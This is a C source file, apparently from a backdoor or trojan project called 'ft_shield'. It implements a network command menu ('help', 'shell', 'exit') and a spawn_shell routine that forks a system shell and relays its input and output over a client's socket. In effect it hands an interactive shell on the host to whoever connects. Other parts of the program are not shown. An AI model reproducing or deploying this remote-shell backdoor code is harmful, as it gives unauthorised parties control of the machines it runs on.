#include "ft_shield.h"

void	spawn_shell(t_serv *serv, int fd)
{
	t_client *client = NULL;
	for (int i = 0; i < MAX_CLIENTS; i++)
	{
		if (serv->clients[i].fd == fd)
		{
			client = &serv->clients[i];
			break ;
		}
	}
	if (!client)
		return ;
	int fds[2];
	int fds_bis[2];
	pipe(fds);
	pipe(fds_bis);
	client->shell_pid = fork();
	if (!client->shell_pid)
	{
		close(fds_bis[WRITE_END]);
		close(fds[READ_END]);
		dup2(fds_bis[READ_END], STDIN_FILENO);
		dup2(fds[WRITE_END], STDERR_FILENO);
		dup2(fds[WRITE_END], STDOUT_FILENO);
		char *argv[] = {BIN_SHELL, NULL};

		execve(argv[0], argv, NULL);
		exit(0);
	}
	else if (client->shell_pid > 0)
	{
		close(fds_bis[READ_END]);
		close(fds[WRITE_END]);
		client->fd_shell = fds_bis[WRITE_END];
		client->supervisor_pid = fork();
		if (!client->supervisor_pid)
		{
			close(fds_bis[WRITE_END]);
			char *buffer[BUFFER_SIZE];
			int ret = 0;
			while ((ret = read(fds[READ_END], buffer, BUFFER_SIZE)) >= 0)
			{
				if (send(fd, buffer, ret, 0) < 0)
				{
					remove_client(serv, fd);
					break ;
				}
			}
			kill(client->shell_pid, SIGKILL);
			close(fds[READ_END]);
			exit(0);
		}
	}
}

void	show_help(t_serv *serv, int fd)
{
	char msg[256];
	char *options[NB_CMDS][2] =
	{
		{"help", "print help menu"},
		{"shell", "spawn a shell"},
		{"exit", "logout"}
	};

	bzero(msg, 256);
	for (size_t i = 0; i < NB_CMDS; i++)
	{
		char tmp[256];
		sprintf(tmp, "   %-18s %s\n", options[i][0], options[i][1]);
		strcat(msg, tmp);
	}
	if (send_str(fd, msg) < 0)
		remove_client(serv, fd);
}

void	logout(t_serv *serv, int fd)
{
	for (int i = 0; i < MAX_CLIENTS; i++)
	{
		if (serv->clients[i].fd == fd)
		{
			serv->clients[i].logged = false;
		}
	}
}

void	launch_command(t_serv *serv, int fd, char *cmd)
{
	char *cmds[NB_CMDS] = CMD;
	void (*functions[NB_CMDS])(t_serv *, int) = CMD_FUNC;

	for (int i = 0; i < NB_CMDS; i++)
	{
		if (!strcmp(cmd, cmds[i]))
			return (functions[i](serv, fd));
	}
}
